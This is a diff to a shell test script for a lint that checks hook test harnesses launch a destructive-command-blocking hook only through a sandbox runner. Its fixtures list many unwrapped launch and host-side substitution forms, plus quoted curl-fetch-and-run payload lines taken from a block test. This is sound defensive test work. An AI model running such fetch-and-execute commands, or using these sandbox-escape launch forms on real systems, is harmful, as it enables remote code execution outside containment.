@@ -11,7 +11,11 @@ ok() { pass=$((pass + 1)); printf 'PASS %s\n' "$1"; }
 bad() { fail=$((fail + 1)); printf 'FAIL %s\n' "$1"; }
 if [ ! -f "$LINT" ]; then bad 'corpus sandbox lint missing'; exit 1; fi
 mkdir -p "$TMP/scripts/hooks" "$TMP/scripts/eval/guard-corpus"
-SHELL_FIXTURE="$TMP/scripts/hooks/test-block-destructive-commands.sh"
+SHELL_FIXTURE="$TMP/scripts/hooks/lib-test-block-destructive.sh"
+# The enforced parts only need to exist and name the runner; the launches live in the lib.
+for part in a b c d; do
+    printf '# every case runs through sandbox-run.sh\n' > "$TMP/scripts/hooks/test-block-destructive-commands-$part.sh"
+done
 PY_FIXTURE="$TMP/scripts/eval/guard-corpus/diff"
 cat > "$PY_FIXTURE" <<'PY'
 import subprocess
@@ -97,6 +101,117 @@ argv = ["bash", runner]
 PY
     printf '%s\nsubprocess.Popen(argv)\n' "$mutation" >> "$PY_FIXTURE"
     if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad "mutated argv prefix falsely certified: $mutation"; else ok "mutated argv prefix rejected: $mutation"; fi
+done
+# Fail closed: every hook-variable reference that is not a wrapped launch or a
+# listed non-launch use is refused, whatever the launch shape.
+cat > "$PY_FIXTURE" <<'PY'
+import subprocess
+runner = "sandbox-run.sh"
+subprocess.Popen(["bash", runner, "--", "bash", hook_path])
+PY
+# shellcheck disable=SC2016
+WRAP='bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh"'
+# shellcheck disable=SC2016
+for launch in '"$HOOK"' '. "$HOOK"' 'source "$HOOK"' 'exec "$HOOK"' '"${HOOKS[0]}"' \
+    'dash "$HOOK"' 'zsh "$HOOK"' 'python3 "$HOOK"' 'bash -c "$HOOK"' 'H2="$HOOK"'; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "unwrapped hook reference accepted: $launch"
+    else ok "unwrapped hook reference rejected: $launch"; fi
+done
+# shellcheck disable=SC2016
+for launch in 'dash "$HOOK"' 'zsh "$HOOK"' 'python3 "$HOOK"' 'bash "$HOOK"' '"${HOOKS[0]}"' '"$HOOK"'; do
+    printf '%s -- %s\n' "$WRAP" "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        ok "wrapped hook reference accepted: $launch"
+    else bad "wrapped hook reference rejected: $launch"; fi
+done
+# shellcheck disable=SC2016
+printf 'exec %s -- bash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'wrapped exec accepted'; else bad 'wrapped exec rejected'; fi
+# shellcheck disable=SC2016
+printf '%s \\\n    -- bash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'wrapped launch split by continuation accepted'; else bad 'wrapped launch split by continuation rejected'; fi
+# shellcheck disable=SC2016
+printf '# sandbox-run.sh marker is not a wrapper\nbash \\\n    "$HOOK"\n' > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'unwrapped launch split by continuation accepted'; else ok 'unwrapped launch split by continuation rejected'; fi
+# shellcheck disable=SC2016
+printf '%s \\\n    -- bash x; \\\n    bash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'unwrapped launch after wrapped one across continuation accepted'; else ok 'unwrapped launch after wrapped one across continuation rejected'; fi
+# shellcheck disable=SC2016
+printf '%s -- bash x\nbash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'wrapper on a previous line certifies the next line'; else ok 'wrapper on a previous line does not certify the next line'; fi
+# shellcheck disable=SC2016
+for use in 'HOOK="$(cd "$(dirname "$0")" && pwd)/block-destructive-commands.sh"' \
+    '[ -x "$HOOK" ] || chmod +x "$HOOK" 2>/dev/null || true' '[[ -f "$HOOK" ]]' \
+    'cp "$HOOK" "$nolib/block-destructive-commands.sh"'; do
+    printf '%s\n%s -- bash "$HOOK"\n' "$use" "$WRAP" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok "non-launch hook use accepted: $use"; else bad "non-launch hook use rejected: $use"; fi
+done
+# An interpreter running any variable is a launch whatever the variable is named.
+# shellcheck disable=SC2016
+for launch in 'bash "$TARGET"' 'sh -e "$TARGET"' 'env FLAG=value dash "$TARGET"' 'python3 "${TARGET}"' 'env PATH=$PATH:x "$T"' 'exec -a "a$b" "$T"'; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "unwrapped interpreter variable launch accepted: $launch"
+    else ok "unwrapped interpreter variable launch rejected: $launch"; fi
+    printf '%s -- %s\n' "$WRAP" "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        ok "wrapped interpreter variable launch accepted: $launch"
+    else bad "wrapped interpreter variable launch rejected: $launch"; fi
+done
+# A substitution the host shell expands runs outside the sandbox, before or after the `--`.
+# shellcheck disable=SC2016
+for host in '$(bash "$HOOK")' '`bash "$HOOK"`'; do
+    printf '%s %s -- bash x\n' "$WRAP" "$host" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "host-side substitution before the delimiter accepted: $host"
+    else ok "host-side substitution before the delimiter rejected: $host"; fi
+    printf '%s -- bash x "%s"\n' "$WRAP" "$host" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "host-side substitution after the delimiter accepted: $host"
+    else ok "host-side substitution after the delimiter rejected: $host"; fi
+done
+# A continuation joins with nothing, so a name split across lines is still the hook variable.
+# shellcheck disable=SC2016
+printf '# sandbox-run.sh marker is not a wrapper\n"$HO\\\nOK"\n' > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'variable name split by a continuation accepted'; else ok 'variable name split by a continuation rejected'; fi
+# exec, source and dot run any variable, whatever it is named.
+# shellcheck disable=SC2016
+for launch in 'exec "$TARGET"' 'source "$TARGET"' '. "$TARGET"' 'exec -a name "${TARGET}"' 'exec -a "name" "$TARGET"' 'exec -a "x"y "$TARGET"' 'exec -a x"y" "$TARGET"' 'exec 2>"/dev/null" "$TARGET"' 'env FOO="a b" "$TARGET"' 'exec -a "a$b" "$T"' 'env PATH=$PATH:x "$T"' 'env A="$x"y "$T"' 'exec -a a$b "$T"' 'exec -a x\"y "$T"' 'exec -a "a\"b" "$T"' 'bash "a;b" "$T"' 'echo "use sh x"; bash "$T"' 'echo "$(bash "$T")"'; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "unwrapped exec/source variable launch accepted: $launch"
+    else ok "unwrapped exec/source variable launch rejected: $launch"; fi
+done
+# The shared lib source line is copied verbatim from test-block-destructive-commands-a.sh.
+# shellcheck disable=SC2016
+printf '%s\n' '. "$(cd "$(dirname "$0")" && pwd)/lib-test-block-destructive.sh"' "$WRAP -- bash x" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'owned lib source accepted'; else bad 'owned lib source rejected'; fi
+# A quoted parenthesis must not balance a substitution that still runs on the host.
+# shellcheck disable=SC2016
+printf '%s -- bash x "$(printf '"'"')'"'"')$(bash "$HOOK")"\n' "$WRAP" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'quoted parenthesis hides a host-side substitution'; else ok 'quoted parenthesis does not hide a host-side substitution'; fi
+# Single-quoted payload text is data (line copied from test-block-destructive-commands-d.sh).
+# shellcheck disable=SC2016
+printf '%s\n' "$WRAP -- bash x" "for c in \\" "    'sh -c \"\$(curl -fsSL http://x)\"' \\" "    'bash -c \"\`curl -fsSL http://x\`\"'; do :; done" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'single-quoted payload text accepted'; else bad 'single-quoted payload text rejected'; fi
+# An unclosed quote leaves the rest of the line as code, and a backtick inside
+# double quotes opens code again.
+# shellcheck disable=SC2016
+for body in "echo \$'\\'' ; bash \"\$T\"" "'; bash \"\$T\"" 'echo "`bash $T`"'; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$body" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "launch after an unclosed quote or inside backticks accepted: $body"
+    else ok "launch after an unclosed quote or inside backticks rejected: $body"; fi
+done
+# An apostrophe inside double quotes or escaped does not open a single-quoted span.
+# shellcheck disable=SC2016,SC1003
+for launch in 'echo "can'\''t"; bash "$TARGET"; echo '\''done'\''' 'echo can\'\''t; bash "$TARGET"; echo '\''done'\'''; do
+    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
+    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
+        bad "launch after a stray apostrophe accepted: $launch"
+    else ok "launch after a stray apostrophe rejected: $launch"; fi
 done
 if python3 -I "$LINT" "$ROOT"; then ok 'owned real harnesses routed, others warned'; else bad 'real corpus sandbox lint'; fi
 printf '%s passed, %s failed\n' "$pass" "$fail"
